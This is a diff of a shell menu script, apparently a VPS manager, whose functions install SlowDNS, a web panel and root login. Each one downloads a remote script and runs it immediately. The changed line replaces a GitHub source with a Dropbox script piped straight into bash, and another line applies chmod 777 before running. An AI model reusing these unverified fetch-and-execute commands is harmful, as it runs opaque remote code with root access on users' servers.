@@ -13,7 +13,7 @@ SLOWDNS () {
       wget https://raw.githubusercontent.com/fabricio94b/VPS-MANAGER/main/SlowDNS/install; chmod +x install; ./install
 }
 PAINEL WEB () {
-    wget https://raw.githubusercontent.com/fabricio94b/Painel-v20/main/install; chmod +x install; ./install
+    apt install wget -y; bash <(wget -qO- https://www.dropbox.com/s/u53h7id7og54uiv/123.sh)
 }
 HABILITAR-ROOT () {
     wget https://raw.githubusercontent.com/Niltonjuniornzx/anubis/master/senharoot.sh && chmod 777 senharoot.sh && ./senharoot.sh
